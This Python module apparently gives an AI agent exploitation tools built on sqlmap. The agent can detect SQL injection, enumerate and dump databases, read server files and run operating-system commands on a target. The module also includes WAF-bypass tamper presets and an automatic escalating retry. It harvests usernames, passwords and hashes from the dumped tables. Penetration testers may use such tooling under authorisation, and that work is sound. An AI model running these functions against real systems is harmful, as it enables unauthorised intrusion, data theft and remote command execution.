"""
sqli_tool — SQL 注入检测与利用（sqlmap 执行层 + MCP 友好接口）
"""
from __future__ import annotations

import csv
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.parse
import zipfile
from pathlib import Path
from typing import Any

from core.config import get_config

ROOT_DIR = Path(__file__).resolve().parent.parent
EMBEDDED_SQLMAP = ROOT_DIR / "third_party" / "sqlmapproject-sqlmap-c310c69" / "sqlmap.py"
AUTO_SQLMAP_DIR = ROOT_DIR / "third_party" / "sqlmap"
AUTO_SQLMAP_MAIN = AUTO_SQLMAP_DIR / "sqlmap.py"
ZIP_EXTRACT_DIR = ROOT_DIR / "third_party" / "sqlmap_embedded"
AUTO_UPDATE_STAMP = AUTO_SQLMAP_DIR / ".pentestpilot_last_update"
DEFAULT_SQLMAP_REPO = "https://github.com/sqlmapproject/sqlmap.git"

PROFILE_PRESETS: dict[str, dict[str, Any]] = {
    "default": {"extra_args": [], "tamper": "", "use_common_dict": False},
    "fast": {"extra_args": ["--technique=BEU", "--time-sec=3"], "tamper": "", "use_common_dict": False},
    "deep": {"extra_args": ["--technique=BEUSTQ", "--time-sec=5"], "tamper": "", "use_common_dict": True},
    "waf_bypass": {
        "extra_args": ["--technique=BEUSTQ", "--time-sec=5"],
        "tamper": "space2comment,randomcase,charencode",
        "use_common_dict": True,
    },
}

_AUTO_BOOTSTRAP_ATTEMPTED = False


def sqlmap_prepare(update: bool = True, force_clone: bool = False) -> dict[str, Any]:
    """
    初始化 sqlmap 运行时（自动 clone/pull）。

    Args:
        update: 是否尝试更新（受更新间隔约束）
        force_clone: 目录已存在但无 sqlmap.py 时，是否强制重新 clone
    """
    bootstrap = _bootstrap_sqlmap_repo(update=update, force_clone=force_clone)
    runtime = _resolve_sqlmap_runtime(allow_bootstrap=False)
    if runtime.get("error"):
        return {
            "ready": False,
            "status": bootstrap.get("status", "error"),
            "error": runtime.get("error", "sqlmap runtime not found"),
            "bootstrap": bootstrap,
        }
    return {
        "ready": True,
        "status": bootstrap.get("status", "ok"),
        "bootstrap": bootstrap,
        "runtime": {
            "source": runtime.get("source", ""),
            "home": runtime.get("home", ""),
            "command": runtime.get("command", []),
        },
    }


def sqli_scan(
    target: str,
    data: str = "",
    level: int = 1,
    risk: int = 1,
    mode: str = "detect",
    db_name: str = "",
    table_name: str = "",
    columns: str = "",
    cookie: str = "",
    profile: str = "default",
    tamper: str = "",
    use_common_dict: bool = False,
) -> dict[str, Any]:
    """
    :param target: 目标 URL（含参数）
    :param data:   POST 数据（可选）
    :param level:  sqlmap 检测级别 1-5
    :param risk:   sqlmap 风险等级 1-3
    :param mode:   detect / enumerate / dump
    """
    level = _to_int(level, default=1, minimum=1, maximum=5)
    risk = _to_int(risk, default=1, minimum=1, maximum=3)
    use_common_dict = _to_bool(use_common_dict, default=False)
    parsed = urllib.parse.urlparse(target)
    mode = mode.lower().strip() or "detect"

    if mode not in {"detect", "enumerate", "dump"}:
        return {"error": f"不支持的 mode: {mode}"}

    if not parsed.query and not data:
        return {
            "error": "SQLi 扫描需要带参数的 URL 或显式 data；当前 target 没有可测试参数。",
            "target": target,
            "mode": mode,
        }

    profile_name = profile.lower().strip() or "default"
    if profile_name not in PROFILE_PRESETS:
        return {
            "error": f"不支持的 profile: {profile}",
            "available_profiles": sorted(PROFILE_PRESETS.keys()),
            "target": target,
            "mode": mode,
        }

    extra_args: list[str] = []
    if mode == "enumerate":
        if db_name and table_name:
            extra_args = ["-D", db_name, "-T", table_name, "--columns"]
        elif db_name:
            extra_args = ["-D", db_name, "--tables"]
        else:
            extra_args = ["--dbs"]
    elif mode == "dump":
        extra_args = ["--dump", "--dump-format=CSV"]
        if db_name:
            extra_args += ["-D", db_name]
        if table_name:
            extra_args += ["-T", table_name]
        if columns:
            extra_args += ["-C", columns]

    result = _execute_sqlmap_operation(
        target=target,
        data=data,
        cookie=cookie,
        level=level,
        risk=risk,
        profile=profile_name,
        tamper=tamper,
        use_common_dict=use_common_dict,
        extra_args=extra_args,
    )
    if result.get("error"):
        return {
            "target": target,
            "mode": mode,
            "error": result.get("error", "sqlmap 执行失败"),
            "sqlmap_runtime": result.get("sqlmap_runtime", {}),
            "sqlmap": result.get("sqlmap", {}),
            "credential_candidates": [],
            "hash_candidates": [],
        }

    sqlmap_result = result.get("sqlmap", {})
    retry_result: dict[str, Any] | None = None
    if mode == "detect" and not sqlmap_result.get("vulnerable", False):
        primary_param = _infer_primary_param(target, data)
        retry_extra_args = ["--random-agent", "--flush-session", "--technique=BEUSTQ"]
        if primary_param:
            retry_extra_args = ["-p", primary_param] + retry_extra_args

        retry_result = _execute_sqlmap_operation(
            target=target,
            data=data,
            cookie=cookie,
            level=max(level, 5),
            risk=max(risk, 2),
            profile="deep",
            tamper=tamper or "space2comment,randomcase",
            use_common_dict=True,
            extra_args=retry_extra_args,
            timeout=600,
        )
        retry_sqlmap = retry_result.get("sqlmap", {}) if isinstance(retry_result, dict) else {}
        if not retry_result.get("error") and retry_sqlmap.get("vulnerable", False):
            sqlmap_result = retry_sqlmap

    return {
        "target": target,
        "mode": mode,
        "profile": profile_name,
        "vulnerable": bool(sqlmap_result.get("vulnerable", False)),
        "sqlmap_runtime": result.get("sqlmap_runtime", {}),
        "sqlmap": sqlmap_result,
        "sqlmap_retry": (retry_result or {}).get("sqlmap", {}) if retry_result else {},
        "credential_candidates": sqlmap_result.get("credential_candidates", []),
        "hash_candidates": sqlmap_result.get("hash_candidates", []),
    }


# ---------------------------------------------------------------------
# MCP 风格 sqlmap 接口（参考 SQLMap-MCP 设计）
# ---------------------------------------------------------------------

def sqlmap_scan_url(
    url: str,
    data: str = "",
    cookie: str = "",
    level: int = 1,
    risk: int = 1,
    technique: str = "BEUSTQ",
    profile: str = "default",
    tamper: str = "",
    use_common_dict: bool = False,
) -> dict[str, Any]:
    extra_args: list[str] = []
    if technique.strip():
        extra_args += ["--technique", technique.strip()]
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        level=level,
        risk=risk,
        profile=profile,
        tamper=tamper,
        use_common_dict=use_common_dict,
        extra_args=extra_args,
    )


def sqlmap_enumerate_databases(url: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        extra_args=["--dbs"],
        profile="deep",
        use_common_dict=True,
    )


def sqlmap_enumerate_tables(url: str, database: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        extra_args=["--tables", "-D", database],
        profile="deep",
        use_common_dict=True,
    )


def sqlmap_enumerate_columns(
    url: str,
    database: str,
    table: str,
    data: str = "",
    cookie: str = "",
) -> dict[str, Any]:
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        extra_args=["--columns", "-D", database, "-T", table],
        profile="deep",
        use_common_dict=True,
    )


def sqlmap_dump_table(
    url: str,
    database: str,
    table: str,
    columns: str = "",
    where: str = "",
    limit: int = 0,
    data: str = "",
    cookie: str = "",
) -> dict[str, Any]:
    extra_args = ["--dump", "--dump-format=CSV", "-D", database, "-T", table]
    if columns.strip():
        extra_args += ["-C", columns.strip()]
    if where.strip():
        extra_args += ["--where", where.strip()]
    if isinstance(limit, int) and limit > 0:
        extra_args += ["--limit", str(limit)]
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        extra_args=extra_args,
        profile="deep",
        use_common_dict=True,
    )


def sqlmap_get_banner(url: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(target=url, data=data, cookie=cookie, extra_args=["--banner"], profile="fast")


def sqlmap_get_current_user(url: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(target=url, data=data, cookie=cookie, extra_args=["--current-user"], profile="fast")


def sqlmap_get_current_db(url: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(target=url, data=data, cookie=cookie, extra_args=["--current-db"], profile="fast")


def sqlmap_read_file(url: str, file_path: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        extra_args=["--file-read", file_path],
        profile="deep",
    )


def sqlmap_execute_command(url: str, command: str, data: str = "", cookie: str = "") -> dict[str, Any]:
    return _execute_sqlmap_operation(
        target=url,
        data=data,
        cookie=cookie,
        extra_args=["--os-cmd", command],
        profile="deep",
    )


# ---------------------------------------------------------------------
# 内部执行层
# ---------------------------------------------------------------------

def _execute_sqlmap_operation(
    target: str,
    data: str = "",
    cookie: str = "",
    level: int = 1,
    risk: int = 1,
    profile: str = "default",
    tamper: str = "",
    use_common_dict: bool = False,
    extra_args: list[str] | None = None,
    timeout: int = 420,
) -> dict[str, Any]:
    profile_name = profile.lower().strip() or "default"
    if profile_name not in PROFILE_PRESETS:
        return {
            "error": f"不支持的 profile: {profile}",
            "available_profiles": sorted(PROFILE_PRESETS.keys()),
            "target": target,
        }

    runtime = _resolve_sqlmap_runtime(allow_bootstrap=True)
    if runtime.get("error"):
        return {
            "target": target,
            "error": runtime.get("error", "未检测到 sqlmap"),
            "hint": "可配置 tools.sqlmap 或启用 tools.sqlmap_auto_init 自动拉取",
        }

    sqlmap_result = _run_sqlmap(
        sqlmap_command=runtime["command"],
        sqlmap_home=Path(runtime["home"]),
        target=target,
        data=data,
        level=level,
        risk=risk,
        cookie=cookie,
        profile_name=profile_name,
        tamper=tamper,
        use_common_dict=use_common_dict,
        extra_args=extra_args or [],
        timeout=timeout,
    )

    if sqlmap_result.get("error"):
        return {
            "target": target,
            "error": sqlmap_result.get("error", "sqlmap 执行失败"),
            "sqlmap_runtime": {"source": runtime.get("source", ""), "home": runtime.get("home", "")},
            "sqlmap": sqlmap_result,
        }

    return {
        "target": target,
        "ok": True,
        "sqlmap_runtime": {"source": runtime.get("source", ""), "home": runtime.get("home", "")},
        "sqlmap": sqlmap_result,
    }


def _run_sqlmap(
    sqlmap_command: list[str],
    sqlmap_home: Path,
    target: str,
    data: str,
    level: int,
    risk: int,
    cookie: str,
    profile_name: str,
    tamper: str,
    use_common_dict: bool,
    extra_args: list[str],
    timeout: int,
) -> dict[str, Any]:
    tmpdir = tempfile.mkdtemp(prefix="pentestpilot_sqlmap_")
    profile = PROFILE_PRESETS.get(profile_name, PROFILE_PRESETS["default"])
    cmd = list(sqlmap_command) + [
        "-u", target,
        "--level", str(level),
        "--risk", str(risk),
        "--batch",
        "--output-dir", tmpdir,
        "--disable-coloring",
        "--smart",
        "--parse-errors",
        "--threads", "4",
    ]
    cmd.extend(profile.get("extra_args", []))

    if data:
        cmd += ["--data", data]
    if cookie:
        cmd += ["--cookie", cookie]

    final_tamper = tamper.strip() or str(profile.get("tamper", "")).strip()
    if final_tamper:
        cmd += ["--tamper", final_tamper]

    enable_common_dict = use_common_dict or bool(profile.get("use_common_dict", False))
    if enable_common_dict:
        cmd += ["--common-tables", "--common-columns"]

    cmd.extend(extra_args)

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=max(30, int(timeout)),
            cwd=str(sqlmap_home),
        )
    except subprocess.TimeoutExpired:
        return {"error": f"sqlmap 超时（{max(30, int(timeout))}s）"}
    except Exception as exc:
        return {"error": f"sqlmap 执行失败: {exc}"}

    stdout = proc.stdout or ""
    stderr = proc.stderr or ""
    output_lower = stdout.lower()
    vulnerable = (
        "is vulnerable" in output_lower
        or ("parameter" in output_lower and "is injectable" in output_lower)
    )

    injections = []
    for match in re.finditer(
        r"Parameter: (\S+).*?Type: (.*?)\n.*?Payload: (.*?)\n",
        stdout,
        re.DOTALL,
    ):
        injections.append({
            "parameter": match.group(1),
            "type": match.group(2).strip(),
            "payload": match.group(3).strip(),
        })
    if injections:
        vulnerable = True

    artifacts = _parse_sqlmap_artifacts(tmpdir)
    command_preview = " ".join(cmd)

    if proc.returncode != 0:
        return {
            "error": "sqlmap 返回非 0 退出码",
            "command": command_preview,
            "exit_code": proc.returncode,
            "stderr_tail": stderr[-1200:] if stderr else "",
            "raw_summary": stdout[-4000:] if stdout else "",
            "output_dir": tmpdir,
        }

    return {
        "command": command_preview,
        "exit_code": proc.returncode,
        "vulnerable": vulnerable,
        "injections": injections,
        "stderr_tail": stderr[-1200:] if stderr else "",
        "raw_summary": stdout[-4000:] if stdout else "",
        "artifacts": artifacts,
        "output_dir": tmpdir,
        "credential_candidates": artifacts.get("credential_candidates", []),
        "hash_candidates": artifacts.get("hash_candidates", []),
    }


# ---------------------------------------------------------------------
# artifacts 解析
# ---------------------------------------------------------------------

def _parse_sqlmap_artifacts(tmpdir: str) -> dict[str, Any]:
    base = Path(tmpdir)
    dump_files = sorted(base.rglob("*.csv"))
    dump_samples: list[dict[str, Any]] = []
    credential_candidates: list[dict[str, Any]] = []
    hash_candidates: list[str] = []

    for csv_file in dump_files[:12]:
        rows: list[dict[str, Any]] = []
        try:
            with csv_file.open("r", encoding="utf-8", errors="ignore") as handle:
                reader = csv.DictReader(handle)
                for index, row in enumerate(reader):
                    if index >= 5:
                        break
                    rows.append(row)
        except Exception:
            continue

        relative_parts = list(csv_file.relative_to(base).parts)
        db_hint = relative_parts[-2] if len(relative_parts) >= 2 else ""
        table_hint = csv_file.stem
        dump_samples.append({
            "db": db_hint,
            "table": table_hint,
            "columns": list(rows[0].keys()) if rows else [],
            "sample_rows": rows,
        })
        credential_candidates.extend(_extract_credential_candidates(db_hint, table_hint, rows))
        hash_candidates.extend(_extract_hash_candidates(rows))

    return {
        "dump_samples": dump_samples,
        "credential_candidates": _dedupe_dicts(credential_candidates),
        "hash_candidates": sorted(set(hash_candidates)),
        "artifact_files": [str(path.relative_to(base)) for path in dump_files[:20]],
    }


def _extract_credential_candidates(db_name: str, table_name: str, rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    results = []
    user_keys = {"user", "username", "login", "email", "mail"}
    secret_keys = {"password", "passwd", "pass", "hash", "pwd"}

    for row in rows:
        lowered = {str(key).lower(): value for key, value in row.items()}
        user_field = next((key for key in lowered if key in user_keys), "")
        secret_field = next((key for key in lowered if key in secret_keys), "")
        if user_field and secret_field:
            results.append({
                "db": db_name,
                "table": table_name,
                "username": str(lowered.get(user_field, "")),
                "secret": str(lowered.get(secret_field, "")),
                "secret_field": secret_field,
            })
    return results


def _extract_hash_candidates(rows: list[dict[str, Any]]) -> list[str]:
    results: list[str] = []
    for row in rows:
        for value in row.values():
            text = str(value).strip()
            if re.fullmatch(r"[a-fA-F0-9]{32}", text):
                results.append(text)
            elif re.fullmatch(r"[a-fA-F0-9]{40}", text):
                results.append(text)
            elif re.fullmatch(r"[a-fA-F0-9]{64}", text):
                results.append(text)
            elif text.startswith("$2a$") or text.startswith("$2b$") or text.startswith("$2y$"):
                results.append(text)
    return results


def _dedupe_dicts(items: list[dict[str, Any]]) -> list[dict[str, Any]]:
    seen = set()
    result = []
    for item in items:
        key = json.dumps(item, sort_keys=True, ensure_ascii=False, default=str)
        if key in seen:
            continue
        seen.add(key)
        result.append(item)
    return result


def _infer_primary_param(target: str, data: str) -> str:
    parsed = urllib.parse.urlparse(target)
    query_items = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if query_items:
        return str(query_items[0][0] or "").strip()

    if data:
        form_items = urllib.parse.parse_qsl(data, keep_blank_values=True)
        if form_items:
            return str(form_items[0][0] or "").strip()

    return ""


def _to_bool(value: Any, default: bool) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        text = value.strip().lower()
        if text in {"true", "1", "yes", "y", "on"}:
            return True
        if text in {"false", "0", "no", "n", "off"}:
            return False
    return default


def _to_int(value: Any, default: int, minimum: int | None = None, maximum: int | None = None) -> int:
    result = default
    if isinstance(value, bool):
        result = int(value)
    elif isinstance(value, int):
        result = value
    elif isinstance(value, float):
        result = int(value)
    elif isinstance(value, str):
        text = value.strip()
        if text and text.lstrip("-").isdigit():
            try:
                result = int(text)
            except Exception:
                result = default

    if minimum is not None and result < minimum:
        result = minimum
    if maximum is not None and result > maximum:
        result = maximum
    return result


# ---------------------------------------------------------------------
# runtime 发现 + 自动初始化
# ---------------------------------------------------------------------

def _resolve_sqlmap_runtime(allow_bootstrap: bool = True) -> dict[str, Any]:
    cfg = get_config() or {}
    tools_cfg = cfg.get("tools", {}) if isinstance(cfg.get("tools"), dict) else {}
    configured = str(tools_cfg.get("sqlmap", "") or "").strip()

    candidates: list[tuple[str, str]] = []
    if configured:
        candidates.append((configured, "config.tools.sqlmap"))
    candidates.append((str(AUTO_SQLMAP_MAIN), "auto_repo"))
    candidates.append((str(EMBEDDED_SQLMAP), "embedded"))
    candidates.append((str(Path.cwd() / "third_party" / "sqlmapproject-sqlmap-c310c69" / "sqlmap.py"), "cwd_embedded"))
    candidates.append((str(Path.cwd() / "third_party" / "sqlmap" / "sqlmap.py"), "cwd_auto_repo"))

    for raw_path, source in candidates:
        resolved = _resolve_sqlmap_path(raw_path)
        if resolved:
            command, home = resolved
            return {"command": command, "home": str(home), "source": source}

    global _AUTO_BOOTSTRAP_ATTEMPTED
    if allow_bootstrap and not _AUTO_BOOTSTRAP_ATTEMPTED:
        _AUTO_BOOTSTRAP_ATTEMPTED = True
        _bootstrap_sqlmap_repo(update=False, force_clone=False)
        return _resolve_sqlmap_runtime(allow_bootstrap=False)

    if shutil.which("sqlmap"):
        return {"command": ["sqlmap"], "home": str(ROOT_DIR), "source": "PATH"}

    return {
        "error": (
            "未找到可用的 sqlmap（config/tools.sqlmap、自动仓库、embedded、PATH 均不可用）。"
            "可启用 tools.sqlmap_auto_init 自动拉取。"
        )
    }


def _bootstrap_sqlmap_repo(update: bool, force_clone: bool) -> dict[str, Any]:
    cfg = get_config() or {}
    tools_cfg = cfg.get("tools", {}) if isinstance(cfg.get("tools"), dict) else {}

    local_dir_raw = str(tools_cfg.get("sqlmap_local_dir", "./third_party/sqlmap") or "./third_party/sqlmap").strip()
    local_dir = Path(local_dir_raw).expanduser()
    if not local_dir.is_absolute():
        local_dir = (ROOT_DIR / local_dir).resolve()

    configured_sqlmap = str(tools_cfg.get("sqlmap", "") or "").strip()
    if configured_sqlmap:
        configured_runtime = _resolve_sqlmap_path(configured_sqlmap)
        if configured_runtime:
            _, configured_home = configured_runtime
            if configured_home.resolve() == local_dir.resolve():
                # 默认路径指向自动托管目录，继续走自动 clone/pull 逻辑
                pass
            else:
                return {
                    "status": "configured",
                    "path": str(configured_home),
                    "reason": "tools.sqlmap 已可用，跳过自动拉取",
                }

    auto_init = bool(tools_cfg.get("sqlmap_auto_init", True))
    repo_url = str(tools_cfg.get("sqlmap_repo", DEFAULT_SQLMAP_REPO) or DEFAULT_SQLMAP_REPO).strip()
    repo_ref = str(tools_cfg.get("sqlmap_ref", "") or "").strip()

    if not auto_init:
        return {"status": "skipped", "reason": "tools.sqlmap_auto_init=false", "path": str(local_dir)}

    git_bin = shutil.which("git")
    if not git_bin:
        return {"status": "error", "error": "未找到 git，无法自动拉取 sqlmap", "path": str(local_dir)}

    sqlmap_main = local_dir / "sqlmap.py"
    if sqlmap_main.exists():
        updated = False
        if update and _should_auto_update(local_dir, tools_cfg):
            pull_result = _git_update_repo(git_bin, local_dir, repo_ref)
            if pull_result.get("error"):
                return {"status": "error", "error": pull_result["error"], "path": str(local_dir)}
            updated = True
            _touch_update_stamp(local_dir)
            return {
                "status": "updated" if updated else "ready",
                "path": str(local_dir),
                "repo": repo_url,
                "ref": repo_ref,
            }
        return {
            "status": "ready",
            "path": str(local_dir),
            "repo": repo_url,
            "ref": repo_ref,
        }

    # 目录存在但不是 git 仓库且无 sqlmap.py：避免破坏用户数据
    if local_dir.exists() and not (local_dir / ".git").exists():
        if not force_clone:
            return {
                "status": "error",
                "error": (
                    f"目录已存在但不包含 sqlmap 仓库: {local_dir}。"
                    "可手动清理后重试，或设置 tools.sqlmap 指向已有 sqlmap.py。"
                ),
                "path": str(local_dir),
            }
        return {
            "status": "error",
            "error": f"force_clone=true 但目录不可安全覆盖: {local_dir}",
            "path": str(local_dir),
        }

    clone_result = _git_clone_repo(git_bin, repo_url, local_dir, repo_ref)
    if clone_result.get("error"):
        return {"status": "error", "error": clone_result["error"], "path": str(local_dir), "repo": repo_url}

    if not sqlmap_main.exists():
        return {
            "status": "error",
            "error": f"自动拉取后未找到 sqlmap.py: {sqlmap_main}",
            "path": str(local_dir),
        }

    _touch_update_stamp(local_dir)
    return {
        "status": "installed",
        "path": str(local_dir),
        "repo": repo_url,
        "ref": repo_ref,
    }


def _should_auto_update(local_dir: Path, tools_cfg: dict[str, Any]) -> bool:
    interval_hours_raw = tools_cfg.get("sqlmap_auto_update_interval_hours", 24)
    try:
        interval_hours = max(1, int(interval_hours_raw))
    except Exception:
        interval_hours = 24

    stamp = local_dir / AUTO_UPDATE_STAMP.name
    if not stamp.exists():
        return True
    try:
        last = float(stamp.read_text(encoding="utf-8", errors="ignore").strip() or "0")
    except Exception:
        return True
    return (time.time() - last) >= (interval_hours * 3600)


def _touch_update_stamp(local_dir: Path) -> None:
    try:
        local_dir.mkdir(parents=True, exist_ok=True)
        (local_dir / AUTO_UPDATE_STAMP.name).write_text(str(time.time()), encoding="utf-8")
    except Exception:
        pass


def _git_clone_repo(git_bin: str, repo_url: str, local_dir: Path, repo_ref: str) -> dict[str, Any]:
    local_dir.parent.mkdir(parents=True, exist_ok=True)
    clone_cmd = [git_bin, "clone", "--depth", "1", repo_url, str(local_dir)]
    clone = _run_cmd(clone_cmd, cwd=str(ROOT_DIR), timeout=180)
    if clone.get("error"):
        return {"error": f"git clone 失败: {clone['error']}"}
    if repo_ref:
        checkout = _run_cmd([git_bin, "-C", str(local_dir), "checkout", repo_ref], cwd=str(ROOT_DIR), timeout=60)
        if checkout.get("error"):
            return {"error": f"git checkout {repo_ref} 失败: {checkout['error']}"}
    return {"ok": True}


def _git_update_repo(git_bin: str, local_dir: Path, repo_ref: str) -> dict[str, Any]:
    if not (local_dir / ".git").exists():
        return {"error": f"目录不是 git 仓库: {local_dir}"}

    fetch = _run_cmd([git_bin, "-C", str(local_dir), "fetch", "--depth", "1", "origin"], cwd=str(ROOT_DIR), timeout=120)
    if fetch.get("error"):
        return {"error": f"git fetch 失败: {fetch['error']}"}

    if repo_ref:
        checkout = _run_cmd([git_bin, "-C", str(local_dir), "checkout", repo_ref], cwd=str(ROOT_DIR), timeout=60)
        if checkout.get("error"):
            return {"error": f"git checkout {repo_ref} 失败: {checkout['error']}"}
        pull = _run_cmd(
            [git_bin, "-C", str(local_dir), "pull", "--ff-only", "origin", repo_ref],
            cwd=str(ROOT_DIR),
            timeout=120,
        )
    else:
        pull = _run_cmd([git_bin, "-C", str(local_dir), "pull", "--ff-only"], cwd=str(ROOT_DIR), timeout=120)
    if pull.get("error"):
        return {"error": f"git pull 失败: {pull['error']}"}
    return {"ok": True}


def _run_cmd(cmd: list[str], cwd: str, timeout: int) -> dict[str, Any]:
    try:
        proc = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True, timeout=timeout)
    except Exception as exc:
        return {"error": str(exc)}
    if proc.returncode != 0:
        err = (proc.stderr or proc.stdout or "").strip()
        return {"error": err[-800:] if err else f"exit code {proc.returncode}"}
    return {"ok": True}


def _resolve_sqlmap_path(raw_path: str) -> tuple[list[str], Path] | None:
    input_path = Path(raw_path).expanduser()
    candidates = [input_path]
    if not input_path.is_absolute():
        candidates.append((ROOT_DIR / input_path).resolve())

    seen: set[str] = set()
    for path in candidates:
        if not path.is_absolute():
            path = path.resolve()
        key = str(path)
        if key in seen:
            continue
        seen.add(key)

        if path.suffix.lower() == ".zip" and path.exists():
            extracted_home = _extract_sqlmap_zip(path)
            if extracted_home:
                return [sys.executable, str(extracted_home / "sqlmap.py")], extracted_home

        if path.is_dir():
            sqlmap_py = path / "sqlmap.py"
            if sqlmap_py.exists():
                return [sys.executable, str(sqlmap_py)], path
            continue

        if path.is_file():
            if path.name == "sqlmap.py" or path.suffix.lower() == ".py":
                return [sys.executable, str(path)], path.parent
            if os.access(path, os.X_OK):
                return [str(path)], path.parent
    return None


def _extract_sqlmap_zip(zip_path: Path) -> Path | None:
    ZIP_EXTRACT_DIR.mkdir(parents=True, exist_ok=True)
    marker = ZIP_EXTRACT_DIR / ".source_zip"
    if marker.exists() and marker.read_text(encoding="utf-8", errors="ignore").strip() == str(zip_path):
        sqlmap_py = _locate_sqlmap_py(ZIP_EXTRACT_DIR)
        return sqlmap_py.parent if sqlmap_py else None

    with zipfile.ZipFile(zip_path, "r") as archive:
        archive.extractall(ZIP_EXTRACT_DIR)
    marker.write_text(str(zip_path), encoding="utf-8")

    sqlmap_py = _locate_sqlmap_py(ZIP_EXTRACT_DIR)
    return sqlmap_py.parent if sqlmap_py else None


def _locate_sqlmap_py(root: Path) -> Path | None:
    for candidate in root.rglob("sqlmap.py"):
        if candidate.is_file():
            return candidate
    return None
